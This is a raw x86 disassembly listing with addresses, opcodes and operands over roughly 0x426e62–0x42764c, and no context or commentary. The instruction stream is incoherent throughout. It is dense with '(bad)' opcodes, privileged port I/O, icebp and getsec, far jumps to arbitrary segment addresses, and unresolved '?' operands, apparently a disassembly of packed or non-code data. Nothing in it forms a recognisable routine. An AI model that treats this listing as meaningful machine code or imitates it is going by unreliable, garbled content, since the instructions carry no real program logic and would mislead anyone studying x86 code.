  426e62:	adc    cl,dl
  426e64:	lods   eax,DWORD PTR ds:[esi]
  426e65:	les    ebp,FWORD PTR [edi-0x8]
  426e68:	fldpi  
  426e6a:	loope  0x426e68
  426e6c:	aad    0x53
  426e6e:	clc    
  426e6f:	push   0x72117bff
  426e74:	add    DWORD PTR [esi-0x4a],edi
  426e77:	lods   al,BYTE PTR ds:[esi]
  426e78:	fdivr  DWORD PTR [ecx-0x4c]
  426e7b:	or     eax,0x99a10e40
  426e80:	sub    ebp,DWORD PTR [edi]
  426e82:	lock into 
  426e84:	ins    BYTE PTR es:[edi],dx
  426e85:	cdq    
  426e86:	cld    
  426e87:	push   es
  426e88:	out    dx,al
  426e89:	in     al,dx
  426e8a:	lea    edi,[ebx*1+0x3986f04f]
  426e91:	scas   al,BYTE PTR es:[edi]
  426e92:	outs   dx,BYTE PTR ds:[esi]
  426e93:	sub    al,0x1c
  426e95:	(bad)  
  426e96:	or     BYTE PTR [bx+di],bh
  426e99:	add    bh,bl
  426e9b:	out    0x10,al
  426e9d:	ja     0x426ea9
  426e9f:	inc    esp
  426ea0:	add    DWORD PTR [edx-0x68ef97a7],ebp
  426ea6:	mov    ecx,0x85bc7329
  426eab:	int    0xc9
  426ead:	and    al,0xa2
  426eaf:	retf   0xe815
  426eb2:	mov    ds:0xcaa1c899,al
  426eb7:	or     DWORD PTR [esi+edi*4+0x1546405c],ebx
  426ebe:	add    DWORD PTR [ecx+0x4e],ecx
  426ec1:	jecxz  0x426eaf
  426ec3:	push   0x1d
  426ec5:	pop    ebx
  426ec6:	sbb    esi,DWORD PTR ds:0x8c4db8cc
  426ecc:	ja     0x426f2a
  426ece:	cmp    al,0x5e
  426ed0:	lods   eax,DWORD PTR ds:[esi]
  426ed1:	loop   0x426eea
  426ed3:	sub    al,0x7
  426ed5:	aas    
  426ed6:	lahf   
  426ed7:	fadd   QWORD PTR [ebx+0x1d0664a9]
  426edd:	dec    edx
  426ede:	(bad)  
  426edf:	cmp    BYTE PTR [ecx],dl
  426ee1:	rcl    DWORD PTR [ebx+ebp*2+0xb],0x3f
  426ee6:	int3   
  426ee7:	add    eax,0x2a3af34c
  426eec:	or     ebp,edx
  426eee:	mov    ds:0x71500b57,al
  426ef3:	aas    
  426ef4:	sub    DWORD PTR [edi],eax
  426ef6:	mov    dh,0x9
  426ef8:	pop    edi
  426ef9:	div    DWORD PTR ds:0xc8199ea1
  426eff:	and    bh,BYTE PTR [edx]
  426f01:	popf   
  426f02:	mov    al,ds:0x92089100
  426f07:	std    
  426f08:	addr16 inc edx
  426f0a:	mov    ebx,0x367041a4
  426f0f:	cld    
  426f10:	add    BYTE PTR [ecx],ch
  426f12:	and    DWORD PTR [esi-0x6d],esi
  426f15:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426f17:	xchg   dh,bl
  426f19:	xchg   edi,eax
  426f1a:	mov    edx,0xcc40c20a
  426f1f:	add    ah,BYTE PTR [edx]
  426f21:	mov    dl,0xd6
  426f23:	repnz dec edi
  426f25:	je     0x426fa2
  426f27:	rcr    DWORD PTR [eax],cl
  426f29:	daa    
  426f2a:	dec    esp
  426f2c:	mov    BYTE PTR [edi],bh
  426f2e:	cmp    DWORD PTR [eax+0x29502166],ecx
  426f34:	sub    BYTE PTR [edx],0x39
  426f37:	adc    BYTE PTR [ebp-0x11],dl
  426f3a:	jge    0x426fa5
  426f3c:	mov    ah,BYTE PTR [edx]
  426f3e:	jmp    0xcb64d614
  426f43:	jo     0x426f6b
  426f45:	mov    al,ds:0xcf908769
  426f4a:	in     eax,0xfb
  426f4c:	data16 mov BYTE PTR [ecx+0x60e64efc],dh
  426f53:	scas   al,BYTE PTR es:[edi]
  426f54:	mov    eax,ds:0x7e0c45ac
  426f59:	fmul   QWORD PTR [eax+0x5250022]
  426f5f:	fild   WORD PTR [eax+0x71]
  426f62:	js     0x426f85
  426f64:	sbb    eax,0x89b16247
  426f69:	xor    dh,ch
  426f6b:	not    cl
  426f6d:	pop    ds
  426f6e:	mov    edi,0xc7fb6f05
  426f73:	jecxz  0x426fed
  426f75:	stc    
  426f76:	inc    esp
  426f77:	sbb    al,0x2f
  426f79:	xchg   esi,eax
  426f7a:	fstp   TBYTE PTR [eax]
  426f7c:	inc    edi
  426f7d:	push   ecx
  426f7e:	test   al,0xe2
  426f80:	inc    edi
  426f81:	es jb  0x426fdd
  426f84:	push   esp
  426f85:	imul   edx,DWORD PTR [ebp-0xc],0xffffffed
  426f89:	add    al,0xf
  426f8b:	jnp    0x426f94
  426f8d:	sbb    eax,0xd41bf7ea
  426f92:	xchg   edi,eax
  426f93:	ins    DWORD PTR es:[edi],dx
  426f94:	push   ebp
  426f95:	xor    BYTE PTR [ebx],ah
  426f97:	sbb    ah,BYTE PTR [esp+edx*8+0x7468f327]
  426f9e:	test   eax,0xafbc5aaf
  426fa3:	test   DWORD PTR [ebp+0x71a31b29],edi
  426fa9:	dec    edx
  426faa:	push   esi
  426fab:	and    cl,al
  426fad:	(bad)  
  426faf:	shl    DWORD PTR [edi-0x20],0x57
  426fb3:	ret    
  426fb4:	pop    ecx
  426fb5:	repnz out 0xbe,al
  426fb8:	or     al,0x3f
  426fba:	jl     0x427017
  426fbc:	inc    edx
  426fbd:	arpl   bp,ax
  426fbf:	stos   BYTE PTR es:[edi],al
  426fc0:	das    
  426fc1:	inc    esi
  426fc2:	rol    BYTE PTR [esi+0x77417f31],0x35
  426fc9:	clc    
  426fca:	push   es
  426fcb:	push   ebx
  426fcc:	xor    edi,esp
  426fce:	pop    edx
  426fcf:	in     al,dx
  426fd0:	and    DWORD PTR [edx],edx
  426fd2:	add    BYTE PTR [esi+eax*2-0x31],ah
  426fd6:	es cmp eax,0x47b667a6
  426fdc:	push   edi
  426fdd:	sub    al,al
  426fdf:	push   edi
  426fe0:	enter  0x1ecc,0x8e
  426fe4:	es mov cl,0x45
  426fe7:	push   es
  426fe8:	cwde   
  426fe9:	or     eax,DWORD PTR ds:0x6ea75eb0
  426fef:	pop    ds
  426ff0:	push   edx
  426ff1:	cmc    
  426ff2:	std    
  426ff3:	sub    eax,0x242d3ab4
  426ff8:	and    al,BYTE PTR [ebx-0x39d51fee]
  426ffe:	inc    ecx
  426fff:	mov    DWORD PTR [edx+0x15],esp
  427002:	xor    eax,0x9134ee1b
  427007:	int    0xa4
  427009:	icebp  
  42700a:	pop    esp
  42700b:	mov    cl,0x81
  42700d:	cdq    
  42700e:	dec    esp
  42700f:	xchg   esi,eax
  427010:	stos   BYTE PTR es:[edi],al
  427011:	nop
  427012:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427013:	arpl   WORD PTR [ebx+0x66],bp
  427016:	ret    
  427017:	xor    DWORD PTR [ecx+edx*1-0x22],ebp
  42701b:	iret   
  42701c:	xchg   edi,eax
  42701d:	push   esi
  42701e:	icebp  
  42701f:	imul   ebp,DWORD PTR [edx-0x4050f991],0x55
  427026:	sbb    ecx,DWORD PTR [ebp+eiz*8-0x79c1ca9]
  42702d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42702e:	jbe    0x427041
  427030:	aaa    
  427031:	mov    esp,0x7ac20e6
  427036:	pop    esi
  427037:	rcr    BYTE PTR [ebp-0x74],1
  42703a:	das    
  42703b:	shl    edi,0x92
  42703e:	lods   eax,DWORD PTR ds:[esi]
  42703f:	ret    0x637
  427042:	dec    edx
  427043:	pushf  
  427044:	mov    dh,BYTE PTR [esi+0x50bca401]
  42704a:	pusha  
  42704b:	or     eax,0x200f9f80
  427051:	ror    BYTE PTR [ebp+0x10],cl
  427054:	ror    BYTE PTR [edi-0x451f31e3],0x76
  42705b:	pop    ecx
  42705c:	xchg   edi,eax
  42705d:	pop    esp
  42705e:	scas   al,BYTE PTR es:[edi]
  42705f:	push   ecx
  427060:	jmp    0xd44402ef
  427065:	out    0xa7,eax
  427067:	icebp  
  427068:	add    eax,0x855773ea
  42706d:	dec    ebx
  42706e:	cwde   
  42706f:	or     BYTE PTR [edi-0x3a234390],dh
  427075:	(bad)  
  427076:	ins    BYTE PTR es:[edi],dx
  427077:	push   eax
  427078:	aaa    
  427079:	repz push esp
  42707b:	dec    ebp
  42707c:	inc    ecx
  42707d:	sti    
  42707e:	inc    ecx
  42707f:	or     esi,edi
  427081:	pop    edi
  427082:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427083:	test   BYTE PTR [edi-0x62cfc73d],dh
  427089:	xchg   ebx,ecx
  42708b:	int    0xed
  42708d:	inc    esi
  42708e:	push   edx
  42708f:	fadd   DWORD PTR [ebx-0x12]
  427092:	div    ch
  427094:	jecxz  0x427041
  427096:	js     0x427109
  427098:	jge    0x42702d
  42709a:	or     edx,DWORD PTR ds:0xe06108c6
  4270a0:	xchg   ebx,eax
  4270a1:	int    0xe
  4270a3:	mul    BYTE PTR [edx+esi*2-0x8]
  4270a7:	getsec 
  4270a9:	xchg   BYTE PTR [ecx-0x51eeebac],cl
  4270af:	leave  
  4270b0:	dec    esp
  4270b1:	imul   ebx,DWORD PTR [ecx],0xa22bd13f
  4270b7:	pop    esi
  4270b8:	in     al,dx
  4270b9:	arpl   WORD PTR [edi],cx
  4270bb:	bswap  edx
  4270bd:	stc    
  4270be:	jbe    0x42710b
  4270c0:	pop    es
  4270c1:	add    BYTE PTR [ecx],cl
  4270c3:	add    dl,BYTE PTR [eax+0x11d22f4a]
  4270c9:	inc    edi
  4270ca:	pusha  
  4270cb:	mov    al,0xa4
  4270cd:	jno    0x427119
  4270cf:	cmp    al,0x40
  4270d1:	sar    DWORD PTR [ebx-0x51],cl
  4270d4:	add    DWORD PTR [edi-0x20fa440a],edi
  4270da:	arpl   WORD PTR [eax],ax
  4270dc:	jecxz  0x427099
  4270de:	ret    0x438
  4270e1:	add    cl,bl
  4270e3:	call   0xd4af:0x9f144308
  4270ea:	adc    DWORD PTR [ebx-0x4e8f3009],0xffffffee
  4270f1:	loope  0x4270bc
  4270f3:	sub    eax,esi
  4270f5:	test   BYTE PTR [ebp-0x8],ah
  4270f8:	pushf  
  4270f9:	in     eax,0x17
  4270fb:	in     eax,dx
  4270fc:	je     0x427102
  4270fe:	dec    ecx
  4270ff:	jb     0x42717f
  427101:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427102:	out    dx,al
  427103:	inc    edx
  427104:	lds    eax,FWORD PTR [ebp+0x75]
  427107:	pushf  
  427108:	and    BYTE PTR [edx-0x41da857c],dl
  42710e:	into   
  42710f:	repnz cmp esi,ebp
  427112:	push   edx
  427113:	pop    ds
  427114:	dec    ecx
  427115:	sahf   
  427116:	mov    al,0x8
  427118:	das    
  427119:	shl    BYTE PTR [ecx+0x4bb8918],cl
  42711f:	shr    BYTE PTR [ebx+0x1],0x64
  427123:	add    ebp,DWORD PTR [edx]
  427125:	int3   
  427126:	xor    eax,0x94c2aba8
  42712b:	enter  0xdbfd,0x3c
  42712f:	sbb    al,0x71
  427131:	xchg   ebp,eax
  427132:	sub    eax,0x680a75c9
  427137:	sub    esi,eax
  427139:	mov    al,ds:0xaeaa8256
  42713e:	aam    0xa1
  427140:	mov    esi,0x672d47fc
  427145:	mov    ebx,0x7b48c0a
  42714a:	adc    ebx,DWORD PTR [ebp-0x22]
  42714d:	inc    esp
  42714e:	adc    eax,0x9d807882
  427153:	jno    0x427160
  427155:	ret    0x44a8
  427158:	xor    cl,BYTE PTR [eax-0x66f3a7bf]
  42715e:	ret    0xa538
  427161:	pop    esi
  427162:	sub    DWORD PTR [eax+0x233bea00],0x36947306
  42716c:	pop    edx
  42716d:	jnp    0x4271ab
  42716f:	es xor dl,al
  427172:	add    eax,0x60edba
  427177:	mov    ebx,esp
  427179:	mov    al,0xf4
  42717b:	and    al,0x21
  42717d:	in     al,dx
  42717e:	sbb    eax,0x7fd6f047
  427183:	cmp    eax,0xa360dda9
  427188:	and    al,0xec
  42718a:	xor    bh,ah
  42718c:	mov    eax,0x9230775c
  427191:	retf   0xe02b
  427194:	(bad)  
  427195:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427196:	pop    edx
  427197:	add    ecx,DWORD PTR [esi-0x71]
  42719a:	xchg   edx,eax
  42719b:	xchg   edx,eax
  42719c:	jo     0x42715d
  42719e:	(bad)  
  42719f:	jns    0x4271c8
  4271a1:	push   ebp
  4271a2:	aaa    
  4271a3:	push   esp
  4271a4:	into   
  4271a5:	dec    edi
  4271a6:	mov    ch,0x43
  4271a8:	das    
  4271a9:	push   eax
  4271aa:	xchg   edi,eax
  4271ab:	into   
  4271ac:	fadd   DWORD PTR [ecx]
  4271ae:	and    al,0xc3
  4271b0:	jl     0x4271a2
  4271b2:	stc    
  4271b3:	pop    esp
  4271b4:	mov    cl,0x83
  4271b6:	pshufw mm3,mm6,0xd3
  4271ba:	sbb    eax,0xbc46f747
  4271bf:	call   0xfdc730d5
  4271c4:	mov    al,BYTE PTR [ecx]
  4271c6:	int3   
  4271c7:	dec    esp
  4271c8:	or     BYTE PTR [ebx+0x18],ch
  4271cb:	repz (bad) 
  4271cd:	jns    0x4271ae
  4271cf:	adc    DWORD PTR [ebx],eax
  4271d1:	test   al,0xd8
  4271d3:	aaa    
  4271d4:	sbb    bl,dh
  4271d6:	pop    esp
  4271d7:	int3   
  4271d8:	cmp    al,0x9
  4271da:	xor    DWORD PTR [edx+0x117be0a6],esi
  4271e0:	test   BYTE PTR [ecx+0x48],cl
  4271e3:	jmp    0xb351275e
  4271e8:	lock sbb esp,DWORD PTR [ebx+0x21601528]
  4271ef:	popf   
  4271f0:	shl    BYTE PTR [edi],0xc3
  4271f3:	imul   ebx,DWORD PTR [eax+ebp*4+0x19357036],0x2a8da9e0
  4271fe:	(bad)  
  4271ff:	xchg   ebx,eax
  427200:	jno    0x42725f
  427202:	out    dx,al
  427203:	imul   esi,DWORD PTR [ebp-0x27e0855a],0xffffffba
  42720a:	mov    BYTE PTR [esi+0xfddb0ea],ch
  427210:	add    al,0x75
  427212:	in     eax,0x1f
  427214:	retf   
  427215:	loope  0x427290
  427217:	mov    eax,ds:0x9389900a
  42721c:	sbb    DWORD PTR [edx-0x3b],edx
  42721f:	push   ecx
  427220:	mov    ah,0x30
  427222:	retf   0x2ed7
  427225:	xlat   BYTE PTR ds:[ebx]
  427226:	out    0x3a,al
  427228:	and    al,BYTE PTR [ebx-0x47d5c929]
  42722e:	les    ebx,FWORD PTR [ebx]
  427230:	fbld   TBYTE PTR [esp+eiz*8-0x6354e0d8]
  427237:	fsubr  QWORD PTR [edi-0x660ed839]
  42723d:	mov    bh,0xce
  42723f:	mov    ds:0x7e91c4b7,al
  427244:	out    dx,al
  427245:	cmp    DWORD PTR [edx+edi*4+0x37],edi
  427249:	or     BYTE PTR [ebp+0x7580fc96],al
  42724f:	clc    
  427250:	popf   
  427251:	mov    bl,0x24
  427253:	adc    al,0x5a
  427255:	out    dx,eax
  427256:	les    ebp,FWORD PTR [bx+si]
  427259:	or     BYTE PTR [edx+0x5a],ah
  42725c:	mov    dl,0x45
  42725e:	dec    edi
  42725f:	cmp    DWORD PTR ss:[ebx],0xffffffd4
  427263:	mov    eax,ds:0xf937bf7f
  427268:	daa    
  427269:	aam    0x62
  42726b:	push   ecx
  42726c:	ret    0x9c3f
  42726f:	sbb    eax,ebp
  427271:	shl    esp,cl
  427273:	push   edx
  427274:	cmc    
  427275:	pop    edx
  427276:	adc    DWORD PTR [edi],eax
  427278:	or     bl,bh
  42727a:	xlat   BYTE PTR ds:[ebx]
  42727b:	cmp    cl,dl
  42727d:	mov    ds:0x55441123,eax
  427282:	lock dec edi
  427284:	retf   0x8bc2
  427287:	pop    ebx
  427288:	cs into 
  42728a:	push   esi
  42728b:	cmp    ebx,eax
  42728d:	xchg   ebp,eax
  42728e:	lea    esp,[ecx+0x2e]
  427291:	leave  
  427292:	sub    eax,0xe7a95668
  427297:	push   ecx
  427298:	imul   DWORD PTR [edi+0x4f]
  42729b:	bound  eax,QWORD PTR [esi+0x73656d5c]
  4272a1:	adc    esi,DWORD PTR [edi+0x11282227]
  4272a7:	cli    
  4272a8:	daa    
  4272a9:	in     al,dx
  4272aa:	cmp    BYTE PTR [esi],dh
  4272ac:	push   ebx
  4272ad:	shr    DWORD PTR [eax],cl
  4272af:	push   eax
  4272b0:	jmp    0x9a47:0x1509c8a7
  4272b7:	test   eax,0xe907d45c
  4272bc:	mov    dh,0x4a
  4272be:	addr16 inc eax
  4272c0:	call   0xe229c349
  4272c5:	jmp    0x427342
  4272c7:	jmp    0x4272b9
  4272c9:	or     eax,DWORD PTR [edx-0x35242100]
  4272cf:	pop    ebx
  4272d0:	sub    BYTE PTR [eax+0x4c],0x28
  4272d4:	faddp  st(2),st
  4272d6:	into   
  4272d7:	inc    edx
  4272d8:	fwait
  4272d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4272da:	or     ecx,DWORD PTR [ebp-0x24]
  4272dd:	xchg   DWORD PTR [ecx],ecx
  4272df:	out    dx,eax
  4272e0:	mov    ebx,0xcb84e122
  4272e5:	dec    ebx
  4272e6:	mov    edi,0xdd1d1338
  4272eb:	mov    es,WORD PTR [ecx+0x3077d9b4]
  4272f1:	mov    BYTE PTR [ecx],dh
  4272f3:	aad    0xb2
  4272f5:	pushf  
  4272f6:	pop    esp
  4272f7:	cdq    
  4272f8:	inc    eax
  4272f9:	push   es
  4272fa:	cmp    eax,0x6832b8ae
  4272ff:	pop    ebx
  427300:	xchg   ecx,eax
  427301:	and    BYTE PTR [esi+0x3a],cl
  427304:	push   0x33
  427306:	sub    al,0x42
  427308:	aad    0x0
  42730a:	jle    0x42728e
  42730c:	xchg   DWORD PTR [esi],edi
  42730e:	rol    bl,0xdd
  427311:	jmp    0xaec4:0x50d4b5b5
  427318:	cli    
  427319:	sub    DWORD PTR [ebx+esi*2],esp
  42731c:	xchg   esi,eax
  42731d:	pop    esi
  42731e:	jl     0x4272ab
  427320:	lahf   
  427321:	cmc    
  427322:	mov    ah,BYTE PTR [esp+esi*8]
  427325:	push   es
  427326:	syscall 
  427328:	pop    es
  427329:	jecxz  0x42731b
  42732b:	lea    di,[eax+0x40]
  42732f:	push   edi
  427330:	test   BYTE PTR [ebx+0x78],dh
  427333:	mov    ds:0x7f20c315,al
  427338:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427339:	xor    al,0xc
  42733b:	push   0x74
  42733d:	gs xchg ebx,eax
  42733f:	leave  
  427340:	jle    0x4272c2
  427342:	mov    edi,0x29286091
  427347:	jg     0x427306
  427349:	or     edi,ebx
  42734b:	sub    BYTE PTR [edx],ch
  42734d:	push   esi
  42734e:	jge    0x427391
  427350:	aaa    
  427351:	(bad)
  427356:	ret    0x270c
  427359:	xchg   esi,eax
  42735a:	jne    0x42738c
  42735c:	cmp    eax,0x922a20e
  427361:	rcl    DWORD PTR [edi-0x1f],1
  427364:	and    ebx,DWORD PTR ds:0xef393445
  42736a:	pop    ecx
  42736b:	fadd   st(6),st
  42736d:	push   0xffffffcf
  42736f:	push   esp
  427370:	add    bl,cl
  427372:	lods   eax,DWORD PTR ds:[esi]
  427373:	pushf  
  427374:	dec    edi
  427375:	jb     0x4273f6
  427377:	adc    BYTE PTR [ebx-0x24],cl
  42737a:	lods   al,BYTE PTR ds:[esi]
  42737b:	rcr    BYTE PTR [eax+0x4],1
  42737e:	pop    edi
  42737f:	es aam 0x3f
  427382:	fucomip st,st(1)
  427384:	lock xor BYTE PTR [edx-0x6b8268fe],ch
  42738b:	mov    esp,edi
  42738d:	fcmove st,st(2)
  42738f:	mov    ch,0xa7
  427391:	mov    edx,0xd79752e8
  427396:	push   esi
  427397:	jle    0x4273ab
  427399:	inc    ecx
  42739a:	mov    edi,0x90912017
  42739f:	add    DWORD PTR [ebx+edi*4],eax
  4273a2:	test   al,0x50
  4273a4:	pop    ecx
  4273a5:	push   esi
  4273a6:	leave  
  4273a7:	das    
  4273a8:	stos   BYTE PTR es:[edi],al
  4273a9:	add    DWORD PTR [ebp-0x4556bee],ecx
  4273af:	fs (bad) 
  4273b1:	lock cmp esp,ecx
  4273b4:	add    DWORD PTR [esi+0xb714497],edi
  4273ba:	push   es
  4273bb:	mov    ebp,0xa13d1711
  4273c0:	mov    al,0xe
  4273c2:	pop    ds
  4273c3:	or     eax,0x78400d49
  4273c8:	sti    
  4273c9:	sub    BYTE PTR [esi+0x11],dh
  4273cc:	icebp  
  4273cd:	mov    cl,al
  4273cf:	cmp    cl,BYTE PTR [eax-0x6e133015]
  4273d5:	push   0x87332422
  4273da:	fisubr WORD PTR [edi*4-0x1d80559a]
  4273e1:	add    dl,BYTE PTR [edx+ecx*4-0x7fab5b8]
  4273e8:	pop    eax
  4273e9:	rol    dh,0x33
  4273ec:	mov    DWORD PTR [edx+esi*2],esp
  4273ef:	fs pop edx
  4273f1:	stos   BYTE PTR es:[edi],al
  4273f2:	add    DWORD PTR [eax-0x72],ecx
  4273f5:	sar    BYTE PTR [ebp-0x395fb6ed],cl
  4273fb:	cmp    edi,eax
  4273fd:	mov    ebx,0xd429b45d
  427402:	push   ss
  427403:	pop    ebx
  427404:	cs mov eax,edx
  427407:	mov    ds:0x54c4134a,al
  42740c:	cmp    al,BYTE PTR [esi+0x1ebaa54b]
  427412:	jae    0x42744a
  427414:	sahf   
  427415:	inc    esi
  427416:	mov    al,0xdf
  427418:	ret    
  427419:	pop    esp
  42741a:	cmp    DWORD PTR ss:[eax-0x50],0xdf27b3a7
  427422:	pop    eax
  427423:	sub    eax,0xbee19de2
  427428:	scas   al,BYTE PTR es:[edi]
  427429:	xchg   ebx,eax
  42742a:	xor    esi,ecx
  42742c:	inc    ecx
  42742d:	cmp    DWORD PTR fs:[eax-0x643d2db6],edi
  427434:	cmp    esp,DWORD PTR [ebx+0x78]
  427437:	cld    
  427438:	mov    ebp,0x20dfd07b
  42743d:	jp     0x427439
  42743f:	sti    
  427440:	addr16 mov ch,0x1b
  427443:	push   eax
  427444:	jmp    0x268d:0x6fc32c03
  42744b:	jne    0x427480
  42744d:	inc    esp
  42744e:	or     eax,0x884008d0
  427453:	pop    edi
  427454:	or     BYTE PTR [edx-0xc],al
  427457:	inc    eax
  427458:	leave  
  427459:	or     eax,ecx
  42745b:	js     0x4273f0
  42745d:	push   ebx
  42745e:	cdq    
  42745f:	pop    esp
  427460:	iret   
  427461:	jns    0x4274bf
  427463:	dec    esi
  427464:	dec    ebp
  427465:	push   edx
  427466:	inc    ecx
  427467:	cld    
  427468:	iret   
  427469:	push   ecx
  42746a:	bound  edx,QWORD PTR [edi-0x11ef5859]
  427470:	(bad)  
  427471:	jno    0x42742c
  427473:	pop    eax
  427474:	sar    BYTE PTR [edi-0x27],0x6d
  427478:	and    ebp,DWORD PTR [ecx+edi*4+0x78]
  42747c:	popa   
  42747d:	ret    
  42747e:	lds    ebx,FWORD PTR [ebp-0x2463ee8d]
  427484:	jb     0x4274d6
  427486:	jne    0x4274dd
  427488:	mov    ?,WORD PTR [ebx+0x10]
  42748b:	mov    eax,ds:0x5b1b1378
  427490:	jne    0x42750e
  427492:	cmp    WORD PTR [esp+ebx*2+0x73df466e],cx
  42749a:	jge    0x427509
  42749c:	sbb    eax,0x3f83bef9
  4274a1:	mov    WORD PTR [eax+esi*8+0xb],?
  4274a5:	pop    esp
  4274a6:	mov    dh,0xd
  4274a8:	xlat   BYTE PTR ds:[ebx]
  4274a9:	shl    DWORD PTR [ebp-0x22],1
  4274ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4274ad:	jae    0x427518
  4274af:	fcomp  DWORD PTR [ebp+0x160eee1a]
  4274b5:	xor    ecx,ebx
  4274b7:	mov    cl,0xb1
  4274b9:	jnp    0x42746e
  4274bb:	test   BYTE PTR [edi],dl
  4274bd:	stc    
  4274be:	cmp    DWORD PTR [edx+0x73],0xffffffc0
  4274c2:	add    BYTE PTR [esi],ch
  4274c4:	jp     0x4274e1
  4274c6:	cs imul eax,eax,0x13503166
  4274cd:	(bad)  
  4274ce:	or     eax,0xbb0cff27
  4274d3:	loop   0x4274a1
  4274d5:	cmp    DWORD PTR [ebx-0x60],ecx
  4274d8:	nop
  4274d9:	aam    0xb9
  4274db:	mov    eax,ebx
  4274dd:	iret   
  4274de:	test   BYTE PTR [edx+0x79],0xcf
  4274e2:	push   ebx
  4274e3:	lock or eax,0x9d22125e
  4274e9:	fisubr WORD PTR [edi-0x3d]
  4274ec:	sub    DWORD PTR [eax],edi
  4274ee:	dec    eax
  4274ef:	adc    DWORD PTR [esi+0x57d12856],ebx
  4274f5:	js     0x42756f
  4274f7:	push   ebp
  4274f8:	loopne 0x427545
  4274fa:	mov    esp,ebx
  4274fc:	popf   
  4274fd:	mov    ah,0x42
  4274ff:	cwde   
  427500:	loope  0x427528
  427502:	lahf   
  427503:	in     al,0x28
  427505:	mov    es,WORD PTR [edi]
  427507:	inc    ebx
  427508:	clc    
  427509:	cs out dx,eax
  42750b:	jp     0x427540
  42750d:	popa   
  42750e:	pop    edi
  42750f:	inc    esp
  427510:	mov    ch,0x3e
  427512:	out    dx,eax
  427513:	jne    0x427525
  427515:	push   0xffffffb6
  427517:	push   eax
  427518:	pop    ds
  427519:	(bad)  
  42751a:	loopne 0x427554
  42751c:	and    DWORD PTR [edi+0x3a],ebp
  42751f:	adc    al,cl
  427521:	push   esp
  427522:	outs   dx,BYTE PTR ds:[esi]
  427523:	inc    esi
  427524:	pop    ds
  427525:	mov    ebx,0x5082ad72
  42752a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42752b:	dec    eax
  42752c:	std    
  42752d:	das    
  42752e:	(bad)  
  42752f:	jnp    0x42758c
  427531:	pop    eax
  427532:	jbe    0x42753a
  427534:	int    0x26
  427536:	push   esp
  427537:	xor    ecx,DWORD PTR [ecx+0x1f700e49]
  42753d:	rcl    edx,1
  42753f:	sub    BYTE PTR [ecx],cl
  427541:	mov    ds:0xa229ebc0,eax
  427546:	sti    
  427547:	mov    al,ds:0x46d510c7
  42754c:	pop    ss
  42754d:	cmp    al,0x86
  42754f:	mov    eax,0x69363066
  427554:	jp     0x4275b7
  427556:	mov    dh,0x41
  427558:	adc    esi,DWORD PTR ds:0x55cd240
  42755e:	loop   0x42752b
  427560:	xor    DWORD PTR [edi],0x3099ddb
  427566:	or     BYTE PTR [edx-0x3c],bh
  427569:	add    eax,0x4778b5ef
  42756e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42756f:	inc    esp
  427570:	neg    BYTE PTR [eax+0x3defd8f7]
  427576:	out    dx,al
  427577:	and    eax,0x1113b845
  42757c:	mov    ah,0x4a
  42757e:	cmp    eax,0x3029c66c
  427583:	pushf  
  427584:	add    al,0xbe
  427586:	mov    eax,0x894d84d1
  42758b:	scas   al,BYTE PTR es:[edi]
  42758c:	fdivr  QWORD PTR [edi+0x316128a9]
  427592:	sbb    DWORD PTR [ecx-0x1c218296],eax
  427598:	popf   
  427599:	add    al,BYTE PTR [ecx]
  42759b:	and    bl,BYTE PTR [esi-0x60f17a4a]
  4275a1:	xchg   ebp,eax
  4275a2:	or     ebp,DWORD PTR [edi+eax*2]
  4275a5:	dec    ecx
  4275a6:	mov    edi,0x3bb07358
  4275ab:	adc    eax,0x61e82326
  4275b0:	add    esp,0x32
  4275b3:	xchg   ebp,eax
  4275b4:	or     BYTE PTR [ecx],ah
  4275b6:	(bad)
  4275b9:	mov    dh,0xde
  4275bb:	loop   0x427596
  4275bd:	call   0x9fbabda4
  4275c2:	xadd   bh,dh
  4275c5:	dec    DWORD PTR [ebx]
  4275c7:	and    dl,BYTE PTR [ebx+ebx*2]
  4275ca:	mov    esp,esi
  4275cc:	mov    DWORD PTR [eax+0x19],ecx
  4275cf:	xchg   DWORD PTR [edi],edi
  4275d1:	fs int3 
  4275d3:	inc    ebp
  4275d4:	push   eax
  4275d5:	sahf   
  4275d6:	fdiv   DWORD PTR [esi]
  4275d8:	test   BYTE PTR [ecx],ah
  4275da:	cwde   
  4275db:	or     DWORD PTR [edi-0x4a],0x7524047
  4275e2:	inc    eax
  4275e3:	rcl    BYTE PTR [ebx-0x1e9a83fc],1
  4275e9:	pop    ss
  4275ea:	add    al,0x11
  4275ec:	and    esp,eax
  4275ee:	stos   DWORD PTR es:[edi],eax
  4275ef:	jns    0x427571
  4275f1:	push   ds
  4275f2:	mov    al,BYTE PTR [ecx+esi*8-0x51]
  4275f6:	add    DWORD PTR [ebp-0x39],edx
  4275f9:	pop    ds
  4275fa:	mov    edx,0x59af5e45
  4275ff:	inc    edi
  427600:	xchg   ecx,eax
  427601:	cli    
  427602:	cli    
  427603:	or     bh,ah
  427605:	jne    0x4275c0
  427607:	(bad)  
  427608:	(bad)  
  427609:	dec    esp
  42760a:	sub    al,0x84
  42760c:	dec    ebp
  42760d:	out    dx,al
  42760e:	ins    DWORD PTR es:[edi],dx
  42760f:	fstp   QWORD PTR ds:0xdf558c98
  427615:	les    ebp,FWORD PTR [esi]
  427617:	iret   
  427618:	inc    ebp
  427619:	ds cmp eax,0x3e7e3582
  42761f:	inc    esi
  427620:	loope  0x427653
  427622:	call   0x8b0b:0xd881e84a
  427629:	clc    
  42762a:	lahf   
  42762b:	cld    
  42762c:	sub    al,0x42
  42762e:	sbb    WORD PTR [ebp-0x48],bp
  427632:	cwde   
  427633:	loopne 0x4276b0
  427635:	dec    ebx
  427636:	pop    esp
  427637:	clc    
  427638:	ja     0x42762f
  42763a:	es shl dl,1
  42763d:	iret   
  42763e:	aas    
  42763f:	jmp    0x9c3356b0
  427644:	scas   eax,DWORD PTR es:[edi]
  427645:	inc    ebp
  427646:	not    DWORD PTR [ebx+0xc01e2cf]
  42764c:	jmp    0xe652:0x40152821
